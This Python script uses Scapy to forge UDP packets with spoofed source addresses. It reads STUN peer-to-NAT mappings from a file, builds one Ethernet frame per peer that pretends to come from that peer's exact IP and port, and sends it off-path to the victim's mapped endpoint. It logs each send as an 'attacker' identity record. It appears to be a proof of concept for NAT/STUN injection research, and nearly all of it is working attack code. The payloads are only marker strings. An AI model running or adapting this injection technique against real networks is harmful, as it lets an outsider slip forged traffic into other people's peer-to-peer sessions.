#!/usr/bin/env python3
"""Send one Scapy L2 frame per exact STUN peer tuple to its exact same-socket NAT mapping."""
import json, pathlib, subprocess, time
from scapy.all import Ether, IP, UDP, Raw, sendp, get_if_hwaddr, getmacbyip

ROOT = pathlib.Path("offpath-multi-results")
ROOT.mkdir(parents=True, exist_ok=True)
mapping_path = ROOT / "mappings.json"
deadline = time.time() + 240
while not mapping_path.exists() and time.time() < deadline:
    time.sleep(1)
if not mapping_path.exists():
    raise SystemExit("TIMEOUT waiting for exact STUN mappings")
data = json.loads(mapping_path.read_text())
mappings = data.get("mappings", [])
if not mappings:
    raise SystemExit("FAIL: no exact peer mappings in rendezvous file")

try:
    attacker_ip = subprocess.run(
        ["curl", "-4", "--connect-timeout", "5", "--max-time", "10", "-fsS", "https://api.ipify.org"],
        capture_output=True, text=True, timeout=15
    ).stdout.strip() or "UNKNOWN"
except Exception:
    attacker_ip = "UNKNOWN"

route = subprocess.check_output(["route", "-n", "get", "default"], text=True)
iface = next((line.split(":", 1)[1].strip() for line in route.splitlines() if line.strip().startswith("interface:")), None)
gateway = next((line.split(":", 1)[1].strip() for line in route.splitlines() if line.strip().startswith("gateway:")), None)
if not iface or not gateway:
    raise SystemExit("FAIL: unable to identify default interface/gateway")
src_mac = get_if_hwaddr(iface)
dst_mac = getmacbyip(gateway)
if not dst_mac:
    raise SystemExit(f"FAIL: unable to resolve gateway MAC {gateway}")

records = []
for idx, item in enumerate(mappings):
    payload = f"OFFPATH-MULTI-{idx}".encode()
    frame = (
        Ether(src=src_mac, dst=dst_mac)
        / IP(src=item["peer_ip"], dst=item["mapped_ip"], ttl=64, id=(0x5000+idx))
        / UDP(sport=int(item["peer_port"]), dport=int(item["mapped_port"]))
        / Raw(load=payload)
    )
    packet = bytes(frame)
    check = Ether(packet)
    if len(check[IP]) != 20 + 8 + len(payload):
        raise SystemExit(f"FAIL: bad IP length in frame for peer {idx}")
    if check[IP].chksum is None or check[UDP].chksum is None:
        raise SystemExit(f"FAIL: checksum missing for peer {idx}")
    record = {
        "index": idx,
        "attacker_public_ip": attacker_ip,
        "attacker_interface": iface,
        "spoofed_source": f'{item["peer_ip"]}:{item["peer_port"]}',
        "target_endpoint": f'{item["mapped_ip"]}:{item["mapped_port"]}',
        "payload": payload.decode(),
        "frame_bytes": len(packet),
        "ipv4_total_length": check[IP].len,
        "ipv4_checksum": hex(check[IP].chksum),
        "udp_checksum": hex(check[UDP].chksum),
    }
    print("ATTACK_IDENTITY=" + json.dumps(record, sort_keys=True), flush=True)
    sendp(frame, iface=iface, count=1, verbose=False)
    records.append(record)

(ROOT / "attacker-sends.json").write_text(json.dumps(records, indent=2)+"\n")
print(f"SENDP_COMPLETED frames={len(records)}", flush=True)
